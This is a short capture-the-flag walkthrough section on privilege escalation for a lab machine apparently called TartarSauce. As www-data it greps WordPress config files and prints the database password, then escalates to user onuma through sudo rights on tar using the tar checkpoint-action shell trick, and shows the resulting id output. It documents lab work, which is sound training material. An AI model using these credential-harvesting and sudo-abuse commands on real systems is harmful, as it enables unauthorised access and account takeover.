# 25 - PrivEsc


# Open ports

```
www-data@TartarSauce:/var/www/html/webservices/wp$ ss -ltn
State       Recv-Q Send-Q                                                                         Local Address:Port                                                                                        Peer Address:Port              
LISTEN      0      80                                                                                 127.0.0.1:3306                                                                                                   *:*                  
LISTEN      0      128                                                                                        *:80                                                                                                     *:*                  
```

Port 3306 should be mysql 


# mysql username and password
```bash
www-data@TartarSauce:/var/www/html/webservices/wp$ grep -Ri DB_USER .
./wp-includes/load.php: $wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
./wp-config-sample.php.bkp:define('DB_USER', 'username_here');
./wp-config.php:define('DB_USER', 'wpuser');
./wp-admin/setup-config.php:    define('DB_USER', $uname);
./wp-admin/setup-config.php:                    case 'DB_USER'     :
```
```bash
www-data@TartarSauce:/var/www/html/webservices/wp$ grep -Ri DB_PASS .
./wp-includes/load.php: $wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
./wp-config-sample.php.bkp:define('DB_PASSWORD', 'password_here');
./wp-config.php:define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
./wp-admin/setup-config.php:    define('DB_PASSWORD', $pwd);
./wp-admin/setup-config.php:                    case 'DB_PASSWORD' :
```

# sudo permissions on /bin/tar
![](vx_images/3306326535488.png)

# We need to run the binary as onuma
https://gtfobins.github.io/gtfobins/tar/
```
www-data@TartarSauce:/var/www/html/webservices/wp$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```
